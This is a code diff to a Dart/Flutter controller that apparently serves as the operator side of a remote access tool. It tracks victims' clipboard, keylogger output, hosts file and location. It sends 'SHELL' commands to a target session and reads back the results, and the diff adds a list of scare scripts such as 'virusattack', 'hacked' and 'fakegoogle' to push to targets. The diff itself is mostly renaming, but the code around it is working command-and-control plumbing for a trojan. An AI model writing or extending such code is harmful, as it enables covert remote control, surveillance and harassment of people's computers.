@@ -22,7 +22,8 @@ class GeneralController extends GetxController {
   RxString clipboardData = 'No data'.obs,
       keyloggerData = ''.obs,
       hostFileData = ''.obs,
-      shellData = ''.obs;
+      shellData = ''.obs,
+      selectedScript = 'hacked'.obs;
   RxString publicIP = ''.obs,
       country = ''.obs,
       city = ''.obs,
@@ -44,8 +45,23 @@ class GeneralController extends GetxController {
   RxList<Account> accounts = <Account>[].obs;
   RxList<Program> programs = <Program>[].obs;
   RxList<FileItem> files = <FileItem>[].obs;
+  RxList<String> scriptNames = <String>[
+    "fakegoogle",
+    "virusattack",
+    "sphereanimation",
+    "cyberattack",
+    "bouncingball",
+    "error",
+    "matrix",
+    "tree",
+    "hacked",
+    "eainstaller",
+    "virusbox",
+    "showmessage",
+    "playwindowssoundcontinously",
+  ].obs;
 
-  final generalController = TextEditingController().obs;
+  final commonController = TextEditingController().obs;
 
   IoAttackerController ioAttackerController = Get.put(IoAttackerController());
 
@@ -197,12 +213,12 @@ class GeneralController extends GetxController {
           "text": "SHELL",
           "command_args": {
             "session_id": sessionId,
-            "command": generalController.value.text.trim()
+            "command": commonController.value.text.trim()
           }
         },
       );
       maxLines.value = 2;
-      generalController.value.text = response["result"];
+      commonController.value.text = response["result"];
     } catch (e) {
       Utils.toastMsg("Error: $e");
     }
@@ -214,7 +230,7 @@ class GeneralController extends GetxController {
         targetId: targetId,
         data: {"text": "GET_HOSTFILE_CONTENTS", "command_args": {}},
       );
-      generalController.value.text = response["result"];
+      commonController.value.text = response["result"];
     } catch (e) {
       Utils.toastMsg("Error: $e");
     }
